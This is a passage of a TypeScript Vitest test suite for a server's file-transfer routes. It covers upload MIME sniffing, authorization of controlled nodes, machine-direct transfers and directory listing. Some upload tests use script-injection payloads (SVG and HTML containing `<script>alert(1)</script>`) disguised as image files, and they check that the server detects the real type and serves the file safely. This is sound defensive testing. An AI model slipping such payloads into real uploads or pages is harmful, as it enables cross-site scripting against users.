import { beforeEach, describe, expect, it, vi } from 'vitest';
import { Hono } from 'hono';
import {
  FILE_TRANSFER_LIMITS,
  FILE_TRANSFER_DIRECTORY_CAPABILITY,
  FILE_TRANSFER_DIRECTORY_QUERY_CAPABILITY,
  FILE_TRANSFER_DOWNLOAD_STREAM_CAPABILITY,
  FILE_TRANSFER_PATH_HANDLE_CAPABILITY,
  FILE_TRANSFER_PATH_MAX_BYTES,
  FILE_TRANSFER_MSG,
  FILE_TRANSFER_UPLOAD_FETCH_CAPABILITY,
  FILE_TRANSFER_RELAY_HEADER,
  formatFileTransferRangeRequest,
} from '../../shared/transport/file-transfer.js';
import { DIRECT_FILE_TRANSFER_UPLOAD_RECOVERY_CAPABILITY } from '../../shared/direct-file-transfer.js';
import {
  MACHINE_DIRECT_FILE_TRANSFER_CAPABILITY,
  MACHINE_DIRECT_FILE_FETCH_CAPABILITY,
  MACHINE_DIRECT_FILE_TRANSFER_LIMITS,
  MACHINE_DIRECT_FILE_TRANSFER_MSG,
} from '../../shared/machine-direct-file-transfer.js';

const { sendFileTransferRequestMock, isDaemonConnectedMock, hasDaemonCapabilityMock, daemonConnectionGenerationMock, mockResolveServerMemberAccessOrShareDeny, mockResolveHttpShareAccessForCoveredSession, queryOneMock, executeMock } = vi.hoisted(() => ({
  sendFileTransferRequestMock: vi.fn(),
  isDaemonConnectedMock: vi.fn(),
  hasDaemonCapabilityMock: vi.fn(),
  daemonConnectionGenerationMock: vi.fn(),
  mockResolveServerMemberAccessOrShareDeny: vi.fn(),
  mockResolveHttpShareAccessForCoveredSession: vi.fn(),
  queryOneMock: vi.fn(),
  executeMock: vi.fn(async () => ({ changes: 1 })),
}));

vi.mock('../src/security/authorization.js', () => ({
  requireAuth: () => async (c: { req: { header: (name: string) => string | undefined }; set: (key: string, value: string) => void }, next: () => Promise<void>) => {
    if (!c.req.header('Authorization')) {
      return new Response(JSON.stringify({ error: 'unauthorized' }), {
        status: 401,
        headers: { 'Content-Type': 'application/json' },
      });
    }
    c.set('userId', 'user-1');
    if (c.req.header('X-Server-Id')) {
      c.set('nodeRole', 'full');
      c.set('authServerId', c.req.header('X-Server-Id')!);
    }
    return next();
  },
  resolveServerRole: vi.fn().mockResolvedValue('owner'),
}));

vi.mock('../src/ws/bridge.js', () => ({
  WsBridge: {
    get: () => ({
      isDaemonConnected: isDaemonConnectedMock,
      sendFileTransferRequest: sendFileTransferRequestMock,
      hasDaemonCapability: hasDaemonCapabilityMock,
      daemonConnectionGeneration: daemonConnectionGenerationMock,
    }),
  },
}));

vi.mock('../src/routes/share-http-auth.js', () => ({
  resolveServerMemberAccessOrShareDeny: (...args: unknown[]) => mockResolveServerMemberAccessOrShareDeny(...args),
  resolveHttpShareAccessForCoveredSession: (...args: unknown[]) => mockResolveHttpShareAccessForCoveredSession(...args),
}));

vi.mock('../src/util/logger.js', () => ({
  default: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() },
}));

vi.mock('../src/security/crypto.js', () => ({
  randomHex: (bytes: number) => 'a'.repeat(bytes * 2),
}));

import { fileTransferRoutes } from '../src/routes/file-transfer.js';

function makeApp(serverUrl = 'http://localhost'): Hono {
  const app = new Hono();
  app.use('/*', async (c, next) => {
    (c as never as { env: { DB: unknown; SERVER_URL: string } }).env = {
      // `execute` is the durable machine-action audit (recorded before any controlled-node file operation starts).
      DB: { queryOne: queryOneMock, execute: executeMock },
      SERVER_URL: serverUrl,
    };
    return next();
  });
  app.route('/api/server', fileTransferRoutes);
  return app;
}

function mockSharedFileAccess(role: 'viewer' | 'participant'): void {
  mockResolveServerMemberAccessOrShareDeny.mockResolvedValue({
    ok: false,
    reason: 'share-direct-surface-denied',
  });
  mockResolveHttpShareAccessForCoveredSession.mockResolvedValue({
    membership: 'none',
    actor: {
      kind: 'share',
      effectiveActorRole: role,
      coverage: { target: { kind: 'main', serverId: 'srv-1', sessionName: 'deck_project_brain' } },
    },
  });
}

describe('file-transfer upload route', () => {
  beforeEach(() => {
    sendFileTransferRequestMock.mockReset();
    isDaemonConnectedMock.mockReset();
    hasDaemonCapabilityMock.mockReset();
    daemonConnectionGenerationMock.mockReset().mockReturnValue(1);
    isDaemonConnectedMock.mockReturnValue(true);
    hasDaemonCapabilityMock.mockReturnValue(true);
    mockResolveServerMemberAccessOrShareDeny.mockResolvedValue({ ok: true, role: 'owner' });
    mockResolveHttpShareAccessForCoveredSession.mockReset();
    queryOneMock.mockReset();
    executeMock.mockClear();
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'full', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    sendFileTransferRequestMock.mockResolvedValue({
      type: 'file.upload_done',
      attachment: {
        id: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt',
        source: 'upload',
        daemonPath: '/tmp/upload.txt',
        downloadable: true,
      },
      sourceIdentity: { size: 10, mtimeMs: 1, device: 2, inode: 3 },
    });
  });

  it('uses canonical SERVER_URL for the controlled-node staged download callback', async () => {
    const form = new FormData();
    form.append('file', new File(['hello'], 'hello.txt', { type: 'text/plain' }));

    const response = await makeApp('https://im.codes').request('http://internal-pod:3000/api/server/srv-1/upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer test' },
      body: form,
    });

    expect(response.status).toBe(200);
    const message = sendFileTransferRequestMock.mock.calls[0]?.[1] as { downloadUrl: string };
    expect(new URL(message.downloadUrl).origin).toBe('https://im.codes');
  });

  describe.each([true, false])('upload type detection (relay capability %s)', (relay) => {
    it.each([
      ['image/png', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'image/svg+xml'],
      ['image/jpeg', '<!doctype html><script>alert(1)</script>', 'text/html'],
      ['image/png', '\u0000unknown binary', 'application/octet-stream'],
      ['text/html', Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64'), 'image/png'],
    ] as const)('does not trust client MIME %s', async (claimed, bytes, detected) => {
      hasDaemonCapabilityMock.mockImplementation((capability: string) => capability !== FILE_TRANSFER_UPLOAD_FETCH_CAPABILITY || relay);
      const app = makeApp();
      sendFileTransferRequestMock.mockImplementationOnce(async (_id, message) => {
        expect(message.mime).toBe(detected);
        if (relay) {
          const url = new URL(message.downloadUrl);
          const staged = await app.request(url.pathname + url.search);
          expect(staged.headers.get('content-type')).toBe(detected);
          expect(staged.headers.get('x-content-type-options')).toBe('nosniff');
          expect(staged.headers.get('content-security-policy')).toMatch(/^sandbox;/);
          expect(staged.headers.get('content-disposition')).toMatch(detected === 'image/png' ? /^inline;/ : /^attachment;/);
          expect(Buffer.from(await staged.arrayBuffer())).toEqual(Buffer.from(bytes));
        } else {
          expect(Buffer.from(message.content, 'base64')).toEqual(Buffer.from(bytes));
        }
        return { type: FILE_TRANSFER_MSG.UPLOAD_DONE, attachment: { id: 'a'.repeat(32), source: 'upload', daemonPath: '/tmp/sniffed', downloadable: true } };
      });
      const form = new FormData();
      form.append('file', new File([bytes], 'client.png', { type: claimed }));
      expect((await app.request('/api/server/srv-1/upload', { method: 'POST', headers: { Authorization: 'Bearer test' }, body: form })).status).toBe(200);
      expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).toMatchObject({ mime: detected });
    });
  });

  it('sniffs the assembled file on resumable completion and replay, not the final chunk or the client label', async () => {
    const bytes = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';
    const app = makeApp();
    const clientUploadId = `resumable_${crypto.randomUUID().replaceAll('-', '')}`;
    const request = (chunk: string, offset: number) => {
      const form = new FormData();
      form.append('file', new File([chunk], 'evil.png', { type: 'image/png' }));
      for (const [key, value] of Object.entries({ clientUploadId, uploadOffset: String(offset), uploadTotalSize: String(bytes.length), uploadOriginalName: 'evil.png', uploadLastModified: '1234' })) form.append(key, value);
      return app.request('/api/server/srv-1/upload', { method: 'POST', headers: { Authorization: 'Bearer test' }, body: form });
    };
    expect((await request(bytes.slice(0, 4), 0)).status).toBe(200);
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
    expect((await request(bytes.slice(4), 4)).status).toBe(200);
    expect((await request(bytes.slice(4), 4)).status).toBe(200);
    for (const call of sendFileTransferRequestMock.mock.calls) expect(call[1]).toMatchObject({ mime: 'image/svg+xml', size: bytes.length });
    expect(sendFileTransferRequestMock).toHaveBeenCalledTimes(2);
  });

  it('mints an explicit-path handle only for a FULL source and capable controlled target', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: FILE_TRANSFER_MSG.PATH_HANDLE_DONE,
      requestId: 'a'.repeat(32),
      attachment: {
        id: 'b'.repeat(32),
        source: 'local',
        serverId: '',
        daemonPath: '/tmp/report.txt',
        createdAt: new Date().toISOString(),
        downloadable: true,
      },
      sourceIdentity: { size: 10, mtimeMs: 1, device: 2, inode: 3 },
    });

    const res = await makeApp().request('/api/server/controlled-1/machine-file-handle', {
      method: 'POST',
      headers: {
        Authorization: 'Bearer source-token',
        'X-Server-Id': 'full-1',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ path: '/tmp/report.txt' }),
    });

    expect(res.status).toBe(200);
    await expect(res.json()).resolves.toMatchObject({
      ok: true,
      attachment: { serverId: 'controlled-1', daemonPath: '/tmp/report.txt' },
    });
    expect(hasDaemonCapabilityMock).toHaveBeenCalledWith(FILE_TRANSFER_PATH_HANDLE_CAPABILITY);
    expect(sendFileTransferRequestMock).toHaveBeenCalledWith(
      expect.any(String),
      expect.objectContaining({ type: FILE_TRANSFER_MSG.PATH_HANDLE, path: '/tmp/report.txt' }),
      FILE_TRANSFER_LIMITS.DOWNLOAD_TIMEOUT_MS,
      undefined,
      1,
    );
  });

  it('allows a participant grant but denies a viewer grant for controlled-node files', async () => {
    sendFileTransferRequestMock.mockResolvedValue({
      type: FILE_TRANSFER_MSG.PATH_HANDLE_DONE,
      requestId: 'a'.repeat(32),
      attachment: {
        id: 'b'.repeat(32),
        source: 'local',
        serverId: '',
        daemonPath: '/tmp/report.txt',
        createdAt: new Date().toISOString(),
        downloadable: true,
      },
      sourceIdentity: { size: 10, mtimeMs: 1, device: 2, inode: 3 },
    });
    const request = () => makeApp().request('/api/server/controlled-1/machine-file-handle', {
      method: 'POST',
      headers: {
        Authorization: 'Bearer source-token',
        'X-Server-Id': 'full-1',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ path: '/tmp/report.txt' }),
    });

    queryOneMock.mockResolvedValue({
      user_id: 'machine-owner', node_role: 'controlled', exec_enabled: true,
      revoked_at: null, access_role: 'participant', access_source: 'share', exec_granted: true,
    });
    expect((await request()).status).toBe(200);

    sendFileTransferRequestMock.mockClear();
    queryOneMock.mockResolvedValue({
      user_id: 'machine-owner', node_role: 'controlled', exec_enabled: true,
      revoked_at: null, access_role: 'viewer', access_source: 'share', exec_granted: false,
    });
    const denied = await request();
    expect(denied.status).toBe(403);
    expect(await denied.json()).toEqual({ error: 'target_forbidden' });
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it('singlecasts bounded machine-direct control without receiving file bytes', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    const request = {
      type: MACHINE_DIRECT_FILE_TRANSFER_MSG.REQUEST,
      requestId: 'r'.repeat(32),
      clientUploadId: 'c'.repeat(32),
      capability: 'A'.repeat(43),
      candidates: [{ host: '192.168.2.145', port: 45678 }],
      originalName: 'report.txt',
      size: 5,
      expiresAt: Date.now() + 10_000,
    };
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: MACHINE_DIRECT_FILE_TRANSFER_MSG.DONE,
      requestId: request.requestId,
      attachment: {
        id: 'b'.repeat(32), source: 'upload', serverId: '', daemonPath: '/uploads/report.txt',
        originalName: 'report.txt', size: 5, createdAt: new Date().toISOString(), downloadable: true,
      },
    });
    const beforeDispatch = Date.now();
    const res = await makeApp().request('/api/server/controlled-1/machine-direct-upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: JSON.stringify(request),
    });
    expect(res.status).toBe(200);
    await expect(res.json()).resolves.toMatchObject({
      type: MACHINE_DIRECT_FILE_TRANSFER_MSG.DONE,
      attachment: { serverId: 'controlled-1', size: 5 },
    });
    expect(hasDaemonCapabilityMock).toHaveBeenCalledWith(MACHINE_DIRECT_FILE_TRANSFER_CAPABILITY);
    expect(sendFileTransferRequestMock).toHaveBeenCalledWith(
      request.requestId,
      expect.objectContaining({ ...request, expiresAt: expect.any(Number) }),
      MACHINE_DIRECT_FILE_TRANSFER_LIMITS.TRANSFER_TIMEOUT_MS,
      undefined,
      1,
    );
    const forwarded = sendFileTransferRequestMock.mock.calls[0]?.[1] as { expiresAt: number };
    expect(forwarded.expiresAt).toBeGreaterThanOrEqual(beforeDispatch + MACHINE_DIRECT_FILE_TRANSFER_LIMITS.AUTHORITY_TTL_MS);
    expect(forwarded.expiresAt).toBeLessThanOrEqual(Date.now() + MACHINE_DIRECT_FILE_TRANSFER_LIMITS.AUTHORITY_TTL_MS);
    expect(forwarded.expiresAt).not.toBe(request.expiresAt);
    expect(JSON.stringify(sendFileTransferRequestMock.mock.calls[0]?.[1])).not.toContain('content');
  });

  it('singlecasts reverse-direct fetch with Server-local authority and no file bytes', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    const request = {
      type: MACHINE_DIRECT_FILE_TRANSFER_MSG.FETCH_REQUEST,
      requestId: 'f'.repeat(32),
      capability: 'B'.repeat(43),
      candidates: [{ host: '172.16.253.211', port: 45679 }],
      sourcePath: '/tmp/large.bin',
      expiresAt: Date.now() - 30 * 86_400_000,
    };
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: MACHINE_DIRECT_FILE_TRANSFER_MSG.FETCH_DONE,
      requestId: request.requestId,
      size: 4_294_967_296,
    });
    const beforeDispatch = Date.now();
    const res = await makeApp().request('/api/server/controlled-1/machine-direct-fetch', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: JSON.stringify(request),
    });
    expect(res.status).toBe(200);
    await expect(res.json()).resolves.toEqual({
      type: MACHINE_DIRECT_FILE_TRANSFER_MSG.FETCH_DONE,
      requestId: request.requestId,
      size: 4_294_967_296,
    });
    expect(hasDaemonCapabilityMock).toHaveBeenCalledWith(MACHINE_DIRECT_FILE_FETCH_CAPABILITY);
    const forwarded = sendFileTransferRequestMock.mock.calls[0]?.[1] as Record<string, unknown>;
    expect(forwarded).toMatchObject({ ...request, expiresAt: expect.any(Number) });
    expect(forwarded.expiresAt).toBeGreaterThanOrEqual(beforeDispatch + MACHINE_DIRECT_FILE_TRANSFER_LIMITS.AUTHORITY_TTL_MS);
    expect(forwarded.expiresAt).toBeLessThanOrEqual(Date.now() + MACHINE_DIRECT_FILE_TRANSFER_LIMITS.AUTHORITY_TTL_MS);
    expect(JSON.stringify(forwarded)).not.toContain('content');
  });

  it('rejects a reverse-direct fetch when the capable daemon generation is replaced while reading the body', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    let activeGeneration = 7;
    daemonConnectionGenerationMock.mockImplementation(() => activeGeneration);
    sendFileTransferRequestMock.mockImplementation(async (
      _requestId: string,
      _message: Record<string, unknown>,
      _timeoutMs: number,
      _onProgress: unknown,
      expectedGeneration: number | undefined,
    ) => {
      if (expectedGeneration !== activeGeneration) throw new Error('daemon_generation_changed');
      return { type: MACHINE_DIRECT_FILE_TRANSFER_MSG.FETCH_DONE, requestId: 'f'.repeat(32), size: 1 };
    });

    let releaseBody!: () => void;
    const requestBody = new ReadableStream<Uint8Array>({
      start(controller) {
        releaseBody = () => {
          controller.enqueue(new TextEncoder().encode(JSON.stringify({
            type: MACHINE_DIRECT_FILE_TRANSFER_MSG.FETCH_REQUEST,
            requestId: 'f'.repeat(32),
            capability: 'B'.repeat(43),
            candidates: [{ host: '172.16.253.211', port: 45679 }],
            sourcePath: '/tmp/large.bin',
            expiresAt: Date.now(),
          })));
          controller.close();
        };
      },
    });
    const request = new Request('http://localhost/api/server/controlled-1/machine-direct-fetch', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: requestBody,
      duplex: 'half',
    } as RequestInit & { duplex: 'half' });
    const responsePromise = makeApp().request(request);
    await vi.waitFor(() => expect(daemonConnectionGenerationMock).toHaveBeenCalled());

    activeGeneration = 8;
    releaseBody();

    const response = await responsePromise;
    expect(response.status).toBe(503);
    await expect(response.json()).resolves.toEqual({ error: 'daemon_offline' });
    expect(sendFileTransferRequestMock).toHaveBeenCalledWith(
      'f'.repeat(32),
      expect.objectContaining({ type: MACHINE_DIRECT_FILE_TRANSFER_MSG.FETCH_REQUEST }),
      MACHINE_DIRECT_FILE_TRANSFER_LIMITS.TRANSFER_TIMEOUT_MS,
      undefined,
      7,
    );
  });

  it('rejects injected reverse-direct controls before dispatch', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    const res = await makeApp().request('/api/server/controlled-1/machine-direct-fetch', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: MACHINE_DIRECT_FILE_TRANSFER_MSG.FETCH_REQUEST,
        requestId: 'f'.repeat(32), capability: 'B'.repeat(43),
        candidates: [{ host: '172.16.253.211', port: 45679 }],
        sourcePath: '/tmp/x', expiresAt: Date.now(), injected: true,
      }),
    });
    expect(res.status).toBe(400);
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it('rejects browser auth and injected/public candidates before machine-direct dispatch', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    const request = {
      type: MACHINE_DIRECT_FILE_TRANSFER_MSG.REQUEST,
      requestId: 'r'.repeat(32), clientUploadId: 'c'.repeat(32), capability: 'A'.repeat(43),
      candidates: [{ host: '8.8.8.8', port: 53 }], originalName: 'x', size: 1, expiresAt: Date.now() + 10_000,
    };
    const browser = await makeApp().request('/api/server/controlled-1/machine-direct-upload', {
      method: 'POST', headers: { Authorization: 'Bearer browser', 'Content-Type': 'application/json' }, body: JSON.stringify(request),
    });
    expect(browser.status).toBe(403);
    queryOneMock.mockResolvedValue({ user_id: 'other-user', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: undefined });
    const crossAccount = await makeApp().request('/api/server/controlled-1/machine-direct-upload', {
      method: 'POST', headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...request, candidates: [{ host: '192.168.2.145', port: 1234 }] }),
    });
    expect(crossAccount.status).toBe(403);
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    const injected = await makeApp().request('/api/server/controlled-1/machine-direct-upload', {
      method: 'POST', headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...request, candidates: [{ host: '192.168.2.145', port: 1234 }], targetIp: '10.0.0.8' }),
    });
    expect(injected.status).toBe(400);
    const publicCandidate = await makeApp().request('/api/server/controlled-1/machine-direct-upload', {
      method: 'POST', headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' }, body: JSON.stringify(request),
    });
    expect(publicCandidate.status).toBe(400);
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it.each([
    ['slow by 30 days', -30 * 86_400_000],
    ['fast by 30 days', 30 * 86_400_000],
  ])('accepts a source clock that is %s and forwards a Server-local authority', async (_label, offset) => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    const requestId = 'r'.repeat(32);
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: MACHINE_DIRECT_FILE_TRANSFER_MSG.DONE,
      requestId,
      attachment: {
        id: 'b'.repeat(32), source: 'upload', serverId: '', daemonPath: '/uploads/x',
        originalName: 'x', size: 1, createdAt: new Date().toISOString(), downloadable: true,
      },
    });
    const beforeDispatch = Date.now();
    const res = await makeApp().request('/api/server/controlled-1/machine-direct-upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: MACHINE_DIRECT_FILE_TRANSFER_MSG.REQUEST,
        requestId, clientUploadId: 'c'.repeat(32), capability: 'A'.repeat(43),
        candidates: [{ host: '192.168.2.145', port: 1234 }], originalName: 'x', size: 1,
        expiresAt: Date.now() + offset,
      }),
    });
    expect(res.status).toBe(200);
    const forwarded = sendFileTransferRequestMock.mock.calls[0]?.[1] as { expiresAt: number };
    expect(forwarded.expiresAt).toBeGreaterThanOrEqual(beforeDispatch + MACHINE_DIRECT_FILE_TRANSFER_LIMITS.AUTHORITY_TTL_MS);
    expect(forwarded.expiresAt).toBeLessThanOrEqual(Date.now() + MACHINE_DIRECT_FILE_TRANSFER_LIMITS.AUTHORITY_TTL_MS);
    expect(forwarded.expiresAt).not.toBe(beforeDispatch + offset);
  });

  it('allows an authorized interactive user to browse a controlled-node directory', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: FILE_TRANSFER_MSG.DIRECTORY_LIST_DONE,
      requestId: 'a'.repeat(32),
      path: 'C:\\Users',
      resolvedPath: 'C:\\Users',
      entries: [
        { name: 'Public', path: 'C:\\Users\\Public', isDir: true, hidden: false },
        { name: 'report.txt', path: 'C:\\Users\\report.txt', isDir: false, hidden: false },
      ],
    });
    const res = await makeApp().request('/api/server/controlled-1/machine-file-list', {
      method: 'POST',
      headers: { Authorization: 'Bearer browser', 'Content-Type': 'application/json' },
      body: JSON.stringify({ path: 'C:\\Users' }),
    });
    expect(res.status).toBe(200);
    await expect(res.json()).resolves.toEqual({
      ok: true,
      resolvedPath: 'C:\\Users',
      entries: [
        { name: 'Public', path: 'C:\\Users\\Public', isDir: true, hidden: false },
        { name: 'report.txt', path: 'C:\\Users\\report.txt', isDir: false, hidden: false },
      ],
    });
    expect(hasDaemonCapabilityMock).toHaveBeenCalledWith(FILE_TRANSFER_DIRECTORY_CAPABILITY);
    expect(sendFileTransferRequestMock).toHaveBeenCalledWith(
      'a'.repeat(32),
      expect.objectContaining({ type: FILE_TRANSFER_MSG.DIRECTORY_LIST, path: 'C:\\Users' }),
      FILE_TRANSFER_LIMITS.DOWNLOAD_TIMEOUT_MS,
      undefined,
      1,
    );
  });

  describe('controlled-node directory listing query', () => {
    const querySort = { key: 'modified', direction: 'desc', dirsFirst: true } as const;
    const listDone = (extra: Record<string, unknown> = {}) => ({
      type: FILE_TRANSFER_MSG.DIRECTORY_LIST_DONE,
      requestId: 'a'.repeat(32),
      path: '/d',
      resolvedPath: '/d',
      entries: [{ name: 'new.txt', path: '/d/new.txt', isDir: false, hidden: false, size: 4, mtimeMs: 1_700_000_000_000 }],
      ...extra,
    });
    const post = (body: unknown) => makeApp().request('/api/server/controlled-1/machine-file-list', {
      method: 'POST',
      headers: { Authorization: 'Bearer browser', 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    beforeEach(() => {
      queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    });

    it('forwards the query to a node that advertises the capability and passes truncation through', async () => {
      sendFileTransferRequestMock.mockResolvedValueOnce(listDone({ truncated: true, total: 5002, partial: true }));
      const res = await post({ path: '/d', query: { sort: querySort, nameFilter: 'new' } });
      expect(res.status).toBe(200);
      await expect(res.json()).resolves.toEqual({
        ok: true,
        resolvedPath: '/d',
        entries: [{ name: 'new.txt', path: '/d/new.txt', isDir: false, hidden: false, size: 4, mtimeMs: 1_700_000_000_000 }],
        truncated: true,
        total: 5002,
        partial: true,
      });
      expect(hasDaemonCapabilityMock).toHaveBeenCalledWith(FILE_TRANSFER_DIRECTORY_QUERY_CAPABILITY);
      expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).toMatchObject({ query: { sort: querySort, nameFilter: 'new' } });
    });

    it('drops the query for a node without the capability, so an older node is never sent a field it rejects', async () => {
      hasDaemonCapabilityMock.mockImplementation((capability: string) => capability !== FILE_TRANSFER_DIRECTORY_QUERY_CAPABILITY);
      sendFileTransferRequestMock.mockResolvedValueOnce(listDone());
      const res = await post({ path: '/d', query: { sort: querySort } });
      expect(res.status).toBe(200);
      expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).not.toHaveProperty('query');
      expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).toMatchObject({ type: FILE_TRANSFER_MSG.DIRECTORY_LIST, path: '/d' });
    });

    it('rejects a malformed query and any other extra field before dispatch', async () => {
      for (const body of [
        { path: '/d', query: { sort: { ...querySort, key: 'owner' } } },
        { path: '/d', query: { sort: querySort, nameFilter: 'x'.repeat(300) } },
        { path: '/d', query: { sort: querySort, pattern: '.*' } },
        { path: '/d', extra: 1 },
        { query: { sort: querySort } },
      ]) {
        const res = await post(body);
        expect(res.status, JSON.stringify(body)).toBe(400);
      }
      expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
    });

    it('echoes partial without truncated', async () => {
      sendFileTransferRequestMock.mockResolvedValueOnce(listDone({ partial: true }));
      const res = await post({ path: '/d', query: { sort: querySort } });
      const body = await res.json() as Record<string, unknown>;
      expect(body).toMatchObject({ ok: true, partial: true });
      expect(body).not.toHaveProperty('truncated');
    });

    it('a plain request is forwarded without a query and answered without truncation fields', async () => {
      sendFileTransferRequestMock.mockResolvedValueOnce(listDone({}));
      const res = await post({ path: '/d' });
      const body = await res.json() as Record<string, unknown>;
      expect(body).not.toHaveProperty('truncated');
      expect(body).not.toHaveProperty('partial');
      expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).not.toHaveProperty('query');
    });
  });

  it('uses controlled Owner/Participant grants for interactive uploads instead of ordinary server membership', async () => {
    mockResolveServerMemberAccessOrShareDeny.mockClear();
    mockResolveServerMemberAccessOrShareDeny.mockResolvedValue({
      ok: false,
      reason: 'not_authorized_for_server',
    });
    queryOneMock.mockResolvedValue({
      user_id: 'machine-owner', node_role: 'controlled', exec_enabled: true,
      revoked_at: null, access_role: 'participant', access_source: 'share', exec_granted: true,
    });
    const participantForm = new FormData();
    participantForm.append('file', new File(['hello'], 'hello.txt', { type: 'text/plain' }));
    const participant = await makeApp().request('/api/server/controlled-1/upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer browser' },
      body: participantForm,
    });
    expect(participant.status).toBe(200);
    expect(mockResolveServerMemberAccessOrShareDeny).not.toHaveBeenCalled();
    expect(sendFileTransferRequestMock).toHaveBeenCalledTimes(1);

    sendFileTransferRequestMock.mockClear();
    queryOneMock.mockResolvedValue({
      user_id: 'machine-owner', node_role: 'controlled', exec_enabled: true,
      revoked_at: null, access_role: 'viewer', access_source: 'share', exec_granted: false,
    });
    const viewerForm = new FormData();
    viewerForm.append('file', new File(['denied'], 'denied.txt', { type: 'text/plain' }));
    const viewer = await makeApp().request('/api/server/controlled-1/upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer browser' },
      body: viewerForm,
    });
    expect(viewer.status).toBe(403);
    await expect(viewer.json()).resolves.toEqual({ error: 'target_forbidden' });
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it.each([
    ['cross-account', { user_id: 'other', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: undefined }, true, true, 403, 'target_forbidden'],
    ['revoked', { user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: 1, access_role: undefined }, true, true, 403, 'target_forbidden'],
    ['disabled', { user_id: 'user-1', node_role: 'controlled', exec_enabled: false, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false }, true, true, 403, 'exec_disabled'],
    ['offline', { user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false }, false, true, 503, 'daemon_offline'],
    ['missing capability', { user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false }, true, false, 409, 'capability_unavailable'],
  ] as const)('rejects a %s controlled target before file dispatch', async (_label, row, online, capability, status, error) => {
    queryOneMock.mockResolvedValue(row);
    isDaemonConnectedMock.mockReturnValue(online);
    hasDaemonCapabilityMock.mockReturnValue(capability);
    const res = await makeApp().request('/api/server/controlled-1/machine-file-handle', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
